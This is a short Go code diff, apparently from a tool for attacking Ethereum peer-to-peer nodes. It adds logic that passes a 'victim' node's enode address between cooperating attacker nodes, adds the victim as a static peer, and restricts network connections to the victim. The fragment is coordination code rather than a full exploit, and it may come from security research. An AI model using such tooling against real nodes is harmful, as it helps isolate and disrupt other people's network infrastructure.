@@ -266,6 +266,11 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 			netRestrict.Add("3.0.0.0/8")
 			p2pserver.NetRestrict = &netRestrict
 			log("Set network restrictions:", p2pserver.NetRestrict)
+			
+			err := sendMessage(msg.VictimEnode.SetContent([]byte(victim.Node().String())))
+			if err != nil {
+				fatal(err, "Could not send enode/enr to other peer")
+			}
 		}
 
 		/*if attackPhase==utils.SyncPhase {
@@ -1394,6 +1399,24 @@ func handleMessages() {
 			case msg.TargetHead.Code:
 				targetHead = binary.BigEndian.Uint64(message.Content)
 				log("Set targetHead to", targetHead)
+			case msg.VictimEnode.Code:
+				go func() {
+					victimLock.Lock()
+					if !staticVictimAdded {
+						staticVictimAdded = true
+						victimEnode = enode.MustParse(string(message.Content))
+						p2pserver.AddPeer(victimEnode)
+						log("Victim added to static peers")
+
+						var netRestrict netutil.Netlist
+						netRestrict.Add(victimEnode.IP().String() + "/32")
+						netRestrict.Add("127.0.0.1/32")
+						netRestrict.Add("3.0.0.0/8")
+						p2pserver.NetRestrict = &netRestrict
+						log("Set network restrictions:", p2pserver.NetRestrict)
+					}
+					victimLock.Unlock()
+				}()
 
 
 			/*
